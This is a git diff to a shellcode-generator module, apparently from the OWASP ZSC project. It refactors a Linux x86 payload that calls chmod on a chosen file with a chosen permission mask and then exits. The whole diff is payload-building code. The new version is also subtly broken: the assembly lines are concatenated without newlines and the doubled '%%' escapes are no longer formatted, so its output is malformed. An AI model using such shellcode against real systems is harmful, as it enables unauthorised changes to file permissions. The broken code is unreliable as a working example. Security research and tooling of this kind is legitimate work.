@@ -6,29 +6,30 @@ https://github.com/zscproject/OWASP-ZSC
 http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
 """
+from new_cores import base_module
 from cores import stack
 
 
-def chmod(file, perm_num):
-    return '''
-xor    %%eax,%%eax
-push   %%eax
-%s
-mov    %%esp,%%edx
-%s
-push   %%edx
-push   $0xf
-pop    %%eax
-push   $0x2a
-int    $0x80
-mov    $0x01,%%al
-mov    $0x01,%%bl
-int    $0x80
-''' % (file, perm_num)
+class Module(base_module.BaseModule):
+    perm = base_module.OptString("", "Permission mask")  # TODO improve descr
+    file_dest = base_module.OptString("", "File Target")  # TODO improve descr
 
+    def generate(self):
+        payload = "xor    %%eax,%%eax"
+        payload += "push   %%eax"
+        payload += stack.generate(self.file_dest, '%ebx', 'string')
+        payload += "mov    %%esp,%%edx"
+        payload += stack.generate(self.perm, '%ecx', 'int')
+        payload += "push   %%edx"
+        payload += "push   $0xf"
+        payload += "pop    %%eax"
+        payload += "push   $0x2a"
+        payload += "int    $0x80"
+        payload += "mov    $0x01,%%al"
+        payload += "mov    $0x01,%%bl"
+        payload += "int    $0x80"
 
-def run(data):
-    file_to_perm, perm_num = data[0], data[1]
-    return chmod(
-        stack.generate(file_to_perm, '%ebx', 'string'),
-        stack.generate(perm_num, '%ecx', 'int'))
+        return payload
+
+    def run(self):
+        print(self.generate())
